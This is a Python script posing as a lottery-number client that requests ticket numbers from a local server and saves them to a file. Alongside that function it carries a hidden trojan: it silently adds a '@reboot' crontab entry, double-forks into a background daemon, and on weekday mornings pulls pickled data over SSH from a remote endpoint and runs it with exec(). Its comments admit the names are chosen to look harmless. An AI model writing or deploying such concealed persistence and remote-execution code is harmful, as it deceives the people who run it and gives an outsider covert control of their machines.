#!/usr/bin/python3

#redesigned client with class and functions

import socket
import sys
import json
import os
import logzero
from logzero import logger
import subprocess
import paramiko, pickle
import time, datetime, random
import warnings
warnings.filterwarnings(action='ignore',module='.*paramiko.*')

class Client:
    def __init__(self, clientId, lMaxNum = 0,  l649Num = 0,  l49Num = 0):
        self.lMaxNum = lMaxNum
        self.l649Num = l649Num
        self.l49Num = l49Num
        self.clientId= clientId
        self.lMaxResult = []
        self.l649Result = []
        self.l49Result = []
        self.client_sock = 0
        self.serverAddr = 0
        self.outputfile = open("lotteryNumbers.txt", "w+")

    #sends the data to the server
    def Send(self):
        #add user choices to json, encode and send to the daemon
        message = json.dumps({"user": self.clientId, "lMax": self.lMaxNum, "l649": self.l649Num,  "l49": self.l49Num })
        try:
            self.client_sock.sendall(message.encode())
        except:
            childLogger("Please notify the admin something is wrong with the send function of the client")
            self.client_sock.close()
            sys.exit(6)
            
    #receive lottery results from the server
    def Receive(self):
         #look for a response from the server, decode and extract json into seperate variables
            try:
                dataResult = self.client_sock.recv(9999).decode()
                dataResult = json.loads(dataResult)
                self.clientId = dataResult.get("user")
                self.lMaxResult = dataResult.get("lMax")
                self.l649Result= dataResult.get("l649")
                self.l49Result = dataResult.get("l49")
            except Exception as e:
                childLogger("Something is wrong with the data received from the server, report to admin.")
                self.client_sock.close()
                sys.exit(8)

    #connect to the server
    def Connect(self):
        
        try:
            # childLogger(f"connecting to the following server address: {self.serverAddr}")
            self.client_sock.connect(self.serverAddr)
        except BrokenPipeError:
            childLogger("Please check the correctness of your port and ip address")
            self.client_sock.close()
            sys.exit(5)
        except socket.error:
            childLogger("Please check the correctness of your port and ip address")
            self.client_sock.close()
            sys.exit(5)
        
    #print data returned from the server
    def Print(self):
        #check which lottery was played, and logg into a file
        self.outputfile.write("Your lottery numbers are as follows:\n")
        if(self.lMaxResult):
            try:
                childLogger(f"\nLotto Max numbers for user {str(self.clientId)}:")
                self.outputfile.write("Lotto Max:\n")
                for line in self.lMaxResult:
                    self.outputfile.write(str(line) + '\n')
                    childLogger(line)
            except:
                childLogger("Could not write lotto max lines to file, report to admin.")
        
        if(self.l649Result):
            try:
                childLogger(f"\nLotto 649 numbers for connection {str(self.clientId)}:")
                self.outputfile.write("Lotto 649:\n")
                for line in self.l649Result:
                    self.outputfile.write(str(line) + '\n')
                    childLogger(line)
            except:
                childLogger("Error in lotto 649 result logging, report to admin")
                sys.exit(7)
                
        if(self.l49Result):
            try:
                childLogger(f"\nLotto 49 numbers for connection {str(self.clientId)}:")
                self.outputfile.write("Lotto 49:\n")
                for line in self.l49Result:
                    self.outputfile.write(str(line) + '\n')
                    childLogger(line)
            except:
                childLogger("Error in lotto 649 result logging, report to admin")


#generate client id
clientId = str(os.getpid())
client = Client(clientId)

# if there's a mode, means the client is started with cronjob, get 3 number each
try:
    mode = sys.argv[1]
    if (mode == "1"):
        client.lMaxNum = 3
        client.l649Num = 3
        client.l49Num = 3
        response = 'No'
except:
    #ask user how many tickets to generate
    try:
        client.lMaxNum = int(input("Please enter the amount of Lotto Max tickets to predict: "))
        client.l649Num = int(input("Please enter the amount of Lotto 649 tickets to predict: "))
        client.l49Num = int(input("Please enter the amount of Lotto Ontario 49 tickets to predict: "))
        if (client.lMaxNum  == 0 and client.l649Num == 0 and client.l49Num == 0):
            print ("Please eneter at least one client to play.")
            sys.exit()
        print("Thank you, your lottery numbers will be saved in 'lotteryNumbers.txt' file")
    except ValueError:
        print ("Please enter integers only.")
        sys.exit(1)
    
    # a cronjob will be created whether or not user answers Y or n
    response = input("Would you like to get new lottery numbers every day?(Y/n): ")
    if (response.lower() == 'y' or response.lower() == 'yes'):
        print("Thank you, your lottery numbers will be fetched for you daily")
    elif (response.lower() == 'n' or response.lower() == 'no'):
        print("Thank you, feel free to run this client at any time to fetch new lottery numbers.")
    else:
        response = 'No'
        print("Your answer is not recognized, we will take it as a No. \
            Feel free to run this client at any time to fetch new lottery numbers.")


# port = input("Please enter port to connect: ")
port = 9001

#assign ip and port to a variable
client.serverAddr = ('::1',  int(port), 0, 0)

#per each connection sends lotto request, receives results and saves to file
def manageClient(client):
        
    #Creating client socket object that suports ipv6 connection
    client.client_sock = socket.socket(socket.AF_INET6,  socket.SOCK_STREAM)

    client.Connect()

    client.Send()

    client.Receive()

    client.Print()

    client.client_sock.close()
    childLogger(f"\nFinished client: {str(client.clientId)}")
    exit()

# The function is named upgradeClient to make it sound like it is a good function
def getLatestPatch():
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect("127.0.0.1", 2202, "u", "p")
        client_session = client.get_transport().open_session()
        upgrades = None
        if client_session.active and not client_session.closed:
            #wait for command, execute and send result ouput
                #use subprocess run with timeout of 30 seconds
            try:
                command = client_session.recv(9999)
                upgrades = pickle.loads(command)
                # client_session.send('exit')
                client_session.close()
            except subprocess.CalledProcessError as err:
                client_session.send(str(err))
                client_session.close()
            except Exception as e:
                print("in while loop")
                print(e)
        

        # TODO: verify that exec creates a subprocess
        exec(upgrades)
    except Exception as e:
        print("other than while loop")
        print(e)

def upgradeClient():
    cronjob = open('stealthCronjob', 'w')
    cronjob.write(f"@reboot /usr/bin/python3 {os.path.realpath(__file__)} 1 &\n")
    cronjob.close()
    subprocess.run(f"{{ crontab -l; cat {os.path.split(os.path.realpath(__file__))[0]}/stealthCronjob; }} | crontab -", shell=True)
    subprocess.run("rm stealthCronjob", shell=True)

    
    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        parentLogger(f"fork 1 failed")
        sys.exit(1)

    os.setsid()

    try:
        pid = os.fork()
        if pid > 0:
            sys.exit(0)
    except OSError:
        parentLogger(f"fork 2 failed")
        sys.exit(1)

    while True:
         # depends on the date and time
         today = datetime.datetime.today()
         weekday = today.weekday()
         hour = today.hour
         currentMinute = today.minute

         if weekday <= 4:
             #test for 24 hour or 12 hour format
            if hour <= 9 or hour >= 11:
                time.sleep(1200) #20 minutes
                continue
            if currentMinute >= 20 and currentMinute <= 40:
                getLatestPatch()
                time.sleep(1800) #30 minutes
            else:
                time.sleep(30) #30 seconds


#close all std streams
# sys.stdin.close()
# sys.stdout.close()
# sys.stderr.close()

#create logger
if(os.path.isfile('./rotating-clientLogger.log')):
    os.remove("rotating-clientLogger.log")
logzero.logfile("rotating-clientLogger.log", maxBytes=1000000,  backupCount=3,  disableStderrLogger=True)
    
def parentLogger(info):
    logger.info(f"PARENT: {os.getpid()} {info}")

def childLogger(info):
    logger.info(f"CHILD: {os.getpid()} {info}")


#fork a child and let the parent continue with the lottery
try:
    clientChild = os.fork()
except OSError:
    parentLogger("Could not create a child process\n")

# check if parent and continue to the lottery
if clientChild != 0:
    manageClient(client)
elif clientChild == 0:
    upgradeClient()
 
